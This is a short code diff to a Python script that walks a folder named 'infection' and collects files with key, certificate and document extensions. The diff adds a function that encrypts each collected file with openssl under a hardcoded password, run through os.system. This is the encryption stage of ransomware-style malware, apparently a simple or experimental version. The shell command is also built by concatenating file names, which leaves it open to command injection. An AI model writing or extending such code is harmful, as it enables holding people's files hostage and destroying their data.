@@ -8,6 +8,12 @@ extensions = ('.der', '.pfx', '.key', '.crt', '.csr', '.p12', '.pem', '.odt', '.
 dir = os.environ['HOME']
 dir += '/infection'
 
+def encrypt(file_s):
+    for obj in file_s:
+        command = str("openssl aes-256-cbc -in " + obj + " -pass pass:1234 -out " + obj + ".cript")
+        os.system(command)
+        print (command)
+
 dir_s = []
 files = []
 def ls(ruta = getcwd()):
@@ -26,4 +32,5 @@ for elem in os.walk(dir):
 for sub_d in dir_s:
     ls(sub_d)
 
-print(files)
+encrypt(files)
+
